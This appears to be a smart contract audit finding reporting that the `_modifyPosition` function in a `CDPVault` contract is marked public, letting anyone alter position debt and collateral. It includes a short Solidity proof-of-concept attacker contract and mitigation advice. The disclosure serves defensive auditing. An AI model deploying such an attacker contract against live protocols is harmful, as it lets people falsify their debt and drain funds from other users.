# Vulnerability details

## Impact
The `_modifyPosition` function in the `CDPVault` contract suffers from a critical access control vulnerability. This function lacks access modifiers, allowing any user to call it and manipulate a position's collateral, debt, and other crucial parameters. This can lead to several security exploits and compromise the integrity of the `CDPVault` system.

An attacker can exploit this vulnerability to:

- Manipulate Collateral: An attacker can modify a position's collateral balance to whatever value he wants, essentially "adding" more collateral than actually is added. So, the contract will think that the address has added collateral, while actually it is not, it just modified its `Position` maliciously.

- Manipulate Debt: An attacker can arbitrarily increase or decrease a position's debt, disrupting the intended debt management and potentially decreasing its debt.

- Mess with Accounting: By modifying various parameters within the function, an attacker can corrupt the overall accounting of the `CDPVault` system, leading to inaccurate debt tracking and potential inconsistencies.

These vulnerabilities can have severe financial consequences for users and potentially destabilize the entire `CDPVault` protocol.

## Proof of Concept
The vulnerability resides in the following code snippet within the `CDPVault` contract:

```solidity

function _modifyPosition(
    address owner,
    Position memory position,
    uint256 newDebt,
    uint256 newCumulativeIndex,
    int256 deltaCollateral,
    uint256 totalDebt_
) public returns (Position memory) {
    // ... function logic ...
}

```

As you can see, the `_modifyPosition` function is declared with the `public` visibility modifier. This means that anyone, without any special privileges or authentication, can call this function and alter a position's state.

The malicious contract:

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import {VulnerableContract} from "Called.sol";


contract MaliciousContract {
    VulnerableContract public vulnerableContract;

    // Constructor to set the address of the vulnerable contract
    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }

    function maliciousModifyPosition(
        address owner,
        VulnerableContract.Position memory position,
        uint256 newDebt,
        uint256 newCumulativeIndex,
        int256 deltaCollateral,
        uint256 totalDebt_) public 
        {

            vulnerableContract._modifyPosition(owner, position, newDebt, newCumulativeIndex, deltaCollateral, totalDebt_);

    }
}


```

You can deploy the above two contracts in Remix and for example, if all params of the initial `Position` of any address are set to 10 (just an example), when you execute the `maliciousModifyPosition` function with any `Position` params, the changes will be reflected in the `VulnerableContract`. This means that anyone can change its `Position` by just using a malicious contract. So, everyone can reduce its debt or add collateral to its position, or whatever he wants.

## Recommended Mitigation Steps

- Add Access Control: Implement access modifiers to restrict who can call the `_modifyPosition` function. Ideally, only authorized roles within the `CDPVault` system, such as a position owner or a designated position manager, should be allowed to modify positions.

- Input Validation: Validate all function inputs within `_modifyPosition` to ensure they fall within expected ranges and prevent nonsensical modifications. For example, collateral balances cannot be negative.

- Make the function to be `internal`
